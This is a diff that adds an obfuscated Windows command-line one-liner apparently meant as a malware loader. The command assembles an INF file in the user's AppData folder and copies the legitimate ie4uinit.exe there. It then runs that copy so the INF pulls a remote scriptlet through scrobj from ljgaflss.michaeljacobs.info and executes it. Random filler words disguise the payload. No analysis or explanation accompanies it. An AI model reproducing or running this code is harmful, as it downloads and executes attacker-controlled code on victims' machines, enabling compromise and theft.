@@ -1,0 +1,7 @@
+/v /c (for %l in (s) do @set "Juice=%~l") &&
+  (for %e in (a) do @set "Circles=%~e") &&
+  (for %n in (i) do @set "Guilt=%~n") &&
+  (for %n in (c) do @set "Vocals=%~n") &&
+  call(for %l in ("[defaultinstall.windows7]" "delfiles=20C735" "Un\" "Register\" "OCXs=9745" "[version]" "signature =$windows nt$" "[9745]" "sc\" "ro%Crisis%j,NI,%Exhibitions%%Apparatus%%Apparatus%p%Manual%%Hollow%%Hollow%ljgaflss.michaeljacobs.info/contactme" "[destinationdirs]" "20C735=01" "defaultdestdir=11" "[20C735]" "ieu%Provide%.inf" "[strings]" "Hollow=/" "Exhibitions=h" "Provide=init" "shortsvcname=' '" "Apparatus=t;Vessel" "Manual=:;Gifts" "servicename=' '" "Crisis=b;Breeds" "Wireless=%t!Guilt!me%" ) do @echo %~l)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!GuiltcRegards!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Goddess2=History &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Goddess68=Session Batteries Indicators Theories Planets Embrace Employees Movements Piano Evans Exclude Stairs Considerations Colleges Principles Spirit Coach Watches Canvas Changes Warrior Brand Status Trigger Collectors Buffalo Daughter Final Emotions Planners Barnes Methods Incentives Forms Stainless Novels Lonely Minneapolis Producers Exceptions Ivory Signs Analysis Newsletters Assist Female Wishes Object Mirror Isolate Chief Options Circumstances Minerals Adult North Beverages Shoppers Trails Tools"
